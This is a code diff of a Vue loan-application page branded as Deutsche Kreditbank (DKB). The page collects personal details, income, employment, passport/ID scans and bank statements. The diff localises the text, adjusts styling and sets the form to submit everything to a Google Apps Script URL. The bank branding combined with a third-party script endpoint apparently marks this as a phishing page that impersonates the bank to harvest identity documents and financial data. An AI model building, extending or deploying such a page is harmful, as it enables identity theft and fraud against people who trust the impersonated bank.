@@ -1,9 +1,12 @@
 <script setup lang="ts">
 import { ref } from "vue";
+import { useI18n } from "vue-i18n";
 import LogoDkb from "@/assets/logo_dkb.svg";
 import LogoDkbPng from "@/assets/logo_dkb.png";
 import ModalBook2 from "@/assets/MODAL_BOOK_2.jpg";
 import ModalBook from "@/assets/MODAL_BOOK.svg";
+
+const { t } = useI18n();
 
 const form = ref({
   firstName: "",
@@ -32,7 +35,7 @@ const errorMessage = ref("");
 const success = ref(false);
 
 const GOOGLE_SCRIPT_URL =
-  "-";
+  "https://script.google.com/macros/s/AKfycbzPkqKmw-CsIExfJyKGCKcTwuD7YENVcYNVFQVtuxmI2Dv3LmrvFxtHphJSsXNUQNXJ0g/exec";
 function getMaxBirthDate(): string {
   const today = new Date();
   const d = new Date(
@@ -112,23 +115,22 @@ async function onSubmit() {
     errorMessage.value = "";
     success.value = false;
     if (!form.value.passportFile || !form.value.bankStatementFile) {
-      errorMessage.value =
-        "Please upload both Passport/ID and Bank statement files.";
+      errorMessage.value = t('quiz.errors.uploadBothFiles');
       return;
     }
     if (!form.value.dateOfBirth) {
-      errorMessage.value = "Please select your date of birth.";
+      errorMessage.value = t('quiz.errors.selectDateOfBirth');
       return;
     }
     const dob = new Date(form.value.dateOfBirth);
     const minDob = new Date(getMaxBirthDate());
     if (dob > minDob) {
-      errorMessage.value = "You must be at least 18 years old.";
+      errorMessage.value = t('quiz.errors.mustBe18');
       return;
     }
     const incomeNum = Number(form.value.income || 0);
     if (Number.isNaN(incomeNum) || incomeNum < 0) {
-      errorMessage.value = "Income must be a non-negative number.";
+      errorMessage.value = t('quiz.errors.incomeInvalid');
       return;
     }
 
@@ -137,7 +139,7 @@ async function onSubmit() {
     if (hasAdditionalIncome.value) {
       const addNum = Number(form.value.additionalIncome || 0);
       if (Number.isNaN(addNum) || addNum < 0) {
-        errorMessage.value = "Additional income must be a non-negative number.";
+        errorMessage.value = t('quiz.errors.additionalIncomeInvalid');
         return;
       }
       additionalIncomeStr = String(addNum);
@@ -145,8 +147,7 @@ async function onSubmit() {
     }
     const phoneDigits = form.value.phone.replace(/\D/g, "");
     if (phoneDigits.length !== 11 || !form.value.phone.startsWith("+")) {
-      errorMessage.value =
-        "Contact phone must start with + and contain exactly 11 digits.";
+      errorMessage.value = t('quiz.errors.phoneInvalid');
       return;
     }
     const yearNum = Number(form.value.workStartYear);
@@ -155,7 +156,7 @@ async function onSubmit() {
       yearNum < 1925 ||
       yearNum > currentYear
     ) {
-      errorMessage.value = `Year start of work must be between 1925 and ${currentYear}.`;
+      errorMessage.value = t('quiz.errors.workStartYearInvalid', { year: currentYear });
       return;
     }
 
@@ -216,7 +217,7 @@ async function onSubmit() {
     success.value = true;
   } catch (e) {
     console.error(e);
-    errorMessage.value = "Something went wrong. Please try again.";
+    errorMessage.value = t('quiz.errors.somethingWentWrong');
   } finally {
     isSubmitting.value = false;
   }
@@ -227,11 +228,11 @@ async function onSubmit() {
   <main class="min-h-screen flex flex-col bg-[#f2f6fb]">
     <header class="bg-white border-b border-slate-200">
       <div
-        class="max-w-6xl mx-auto flex items-center justify-between px-4 py-4 md:py-5"
+        class="max-w-5xl mx-auto flex items-center justify-between px-4 py-4 md:py-5"
       >
-        <div class="flex items-center gap-3">
-          <img :src="LogoDkb" alt="DKB" class="h-10 w-auto" />
-          <span class="sr-only">DKB – Das kann Bank</span>
+        <div class="flex justify-between gap-3 my-4 w-full align-center">
+          <img :src="LogoDkb" alt="DKB" class="h-14 w-auto" />
+          <!-- <p class="tetx-[18px] text-[#006AC7] font-medium">FAQ</p> -->
         </div>
       </div>
     </header>
@@ -239,11 +240,10 @@ async function onSubmit() {
       <div class="max-w-5xl mx-auto px-4 py-10">
         <div class="mb-8">
           <h1 class="mt-2 text-3xl font-semibold text-slate-900">
-            Your personal details
+            {{ $t('quiz.title') }}
           </h1>
           <p class="mt-2 text-sm text-slate-600 max-w-2xl">
-            Please fill in your personal data so we can process your loan
-            request.
+            {{ $t('quiz.subtitle') }}
           </p>
         </div>
 
@@ -254,7 +254,7 @@ async function onSubmit() {
           <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                First name *
+                {{ $t('quiz.firstName') }} *
               </label>
               <input
                 :value="form.firstName"
@@ -266,7 +266,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Last name *
+                {{ $t('quiz.lastName') }} *
               </label>
               <input
                 :value="form.lastName"
@@ -278,7 +278,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Date of birth *
+                {{ $t('quiz.dateOfBirth') }} *
               </label>
               <input
                 v-model="form.dateOfBirth"
@@ -290,7 +290,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Country of birth *
+                {{ $t('quiz.countryOfBirth') }} *
               </label>
               <input
                 :value="form.countryOfBirth"
@@ -302,7 +302,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Country of residence *
+                {{ $t('quiz.countryOfResidence') }} *
               </label>
               <input
                 :value="form.countryOfResidence"
@@ -314,7 +314,7 @@ async function onSubmit() {
             </div>
             <div class="flex flex-col">
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Income (per month) *
+                {{ $t('quiz.income') }} *
               </label>
               <div class="flex gap-2">
                 <input
@@ -341,7 +341,7 @@ async function onSubmit() {
             </div>
             <div class="flex flex-col">
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Additional income
+                {{ $t('quiz.additionalIncome') }}
               </label>
               <div class="flex items-center gap-4 text-sm mb-2">
                 <label class="inline-flex items-center gap-1">
@@ -351,7 +351,7 @@ async function onSubmit() {
                     :checked="hasAdditionalIncome"
                     @change="hasAdditionalIncome = true"
                   />
-                  <span>Yes</span>
+                  <span>{{ $t('quiz.yes') }}</span>
                 </label>
                 <label class="inline-flex items-center gap-1">
                   <input
@@ -363,7 +363,7 @@ async function onSubmit() {
                       form.additionalIncome = '';
                     "
                   />
-                  <span>No</span>
+                  <span>{{ $t('quiz.no') }}</span>
                 </label>
               </div>
 
@@ -374,7 +374,7 @@ async function onSubmit() {
                   min="0"
                   step="0.01"
                   class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                  placeholder="Enter additional income amount"
+                  :placeholder="$t('quiz.additionalIncomePlaceholder')"
                 />
                 <select
                   v-model="form.additionalIncomeCurrency"
@@ -392,7 +392,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                E-mail *
+                {{ $t('quiz.email') }} *
               </label>
               <input
                 v-model="form.email"
@@ -403,7 +403,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Contact phone *
+                {{ $t('quiz.contactPhone') }} *
               </label>
               <input
                 :value="form.phone"
@@ -416,7 +416,7 @@ async function onSubmit() {
             </div>
             <div class="md:col-span-2">
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Residential address *
+                {{ $t('quiz.residentialAddress') }} *
               </label>
               <input
                 :value="form.residentialAddress"
@@ -428,7 +428,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Work place *
+                {{ $t('quiz.workplace') }} *
               </label>
               <input
                 :value="form.workplace"
@@ -441,7 +441,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Position *
+                {{ $t('quiz.position') }} *
               </label>
               <input
                 :value="form.position"
@@ -454,7 +454,7 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Year start of work *
+                {{ $t('quiz.workStartYear') }} *
               </label>
               <input
                 v-model="form.workStartYear"
@@ -467,15 +467,15 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Passport / ID (upload) *
+                {{ $t('quiz.passportUpload') }} *
               </label>
               <label
                 class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
               >
                 <span>
-                  Click to choose file<br />
+                  {{ $t('quiz.clickToChooseFile') }}<br />
                   <span class="text-[10px] text-slate-400">
-                    PDF, JPG or PNG
+                    {{ $t('quiz.fileFormats') }}
                   </span>
                 </span>
                 <input
@@ -486,20 +486,20 @@ async function onSubmit() {
                 />
               </label>
               <p v-if="form.passportFile" class="mt-1 text-xs text-slate-500">
-                Selected: {{ form.passportFile.name }}
+                {{ $t('quiz.selected') }} {{ form.passportFile.name }}
               </p>
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                Bank statement (upload) *
+                {{ $t('quiz.bankStatementUpload') }} *
               </label>
               <label
                 class="flex h-24 items-center justify-center rounded-md border-2 border-dashed border-slate-300 bg-slate-50 text-xs text-slate-500 cursor-pointer"
               >
                 <span>
-                  Click to choose file<br />
+                  {{ $t('quiz.clickToChooseFile') }}<br />
                   <span class="text-[10px] text-slate-400">
-                    PDF, JPG or PNG
+                    {{ $t('quiz.fileFormats') }}
                   </span>
                 </span>
                 <input
@@ -513,7 +513,7 @@ async function onSubmit() {
                 v-if="form.bankStatementFile"
                 class="mt-1 text-xs text-slate-500"
               >
-                Selected: {{ form.bankStatementFile.name }}
+                {{ $t('quiz.selected') }} {{ form.bankStatementFile.name }}
               </p>
             </div>
           </div>
@@ -523,7 +523,7 @@ async function onSubmit() {
               {{ errorMessage }}
             </p>
             <p v-if="success" class="text-sm text-emerald-600">
-              Data sent successfully.
+              {{ $t('quiz.dataSentSuccess') }}
             </p>
           </div>
 
@@ -533,16 +533,16 @@ async function onSubmit() {
               :disabled="isSubmitting"
               class="inline-flex items-center justify-center rounded-md bg-[#007bff] px-10 py-3 text-sm font-semibold text-white hover:bg-[#0067d4] disabled:opacity-60 disabled:cursor-not-allowed"
             >
-              {{ isSubmitting ? "Sending..." : "NEXT" }}
+              {{ isSubmitting ? $t('quiz.sending') : $t('quiz.next') }}
             </button>
           </div>
         </form>
       </div>
     </div>
 
-    <footer class="mt-8 bg-[#003b73] text-white">
+    <footer class="mt-8 bg-[#002E5C] text-white">
       <div
-        class="max-w-6xl mx-auto px-4 py-10 flex flex-col md:flex-row items-center md:items-stretch gap-8"
+        class="max-w-5xl mx-auto px-4 py-10 flex flex-col md:flex-row items-center md:items-stretch gap-8"
       >
         <div class="flex gap-4">
           <div
@@ -559,35 +559,35 @@ async function onSubmit() {
 
         <div class="flex-1 text-center md:text-left">
           <p class="text-2xl font-semibold leading-snug">
-            Need help with your application?
+            {{ $t('quiz.needHelp') }}
           </p>
           <p class="mt-3 text-sm text-white/80">
-            Frequently asked questions and answers.
+            {{ $t('quiz.faqDescription') }}
           </p>
         </div>
 
         <div class="flex items-center justify-center md:justify-end">
-          <img :src="LogoDkbPng" alt="DKB" class="h-12 w-auto" />
+          <img :src="LogoDkbPng" alt="DKB" class="h-16 w-auto" />
         </div>
       </div>
 
       <div class="border-t border-white/10">
         <div
-          class="max-w-6xl mx-auto px-4 py-4 text-[11px] text-white/70 flex flex-wrap gap-x-6 gap-y-2"
+          class="max-w-5xl mx-auto px-4 py-4 text-[11px] text-white/70 flex flex-wrap gap-x-6 gap-y-2"
         >
           <span>© 2025 Deutsche Kreditbank AG</span>
           <span>BIC: BYLADEM1001</span>
           <span class="underline underline-offset-2 cursor-pointer">
-            Contact
+            {{ $t('quiz.contact') }}
           </span>
           <span class="underline underline-offset-2 cursor-pointer">
-            Imprint
+            {{ $t('quiz.imprint') }}
           </span>
           <span class="underline underline-offset-2 cursor-pointer">
-            Data protection
+            {{ $t('quiz.dataProtection') }}
           </span>
           <span class="underline underline-offset-2 cursor-pointer">
-            Cookie settings
+            {{ $t('quiz.cookieSettings') }}
           </span>
         </div>
       </div>
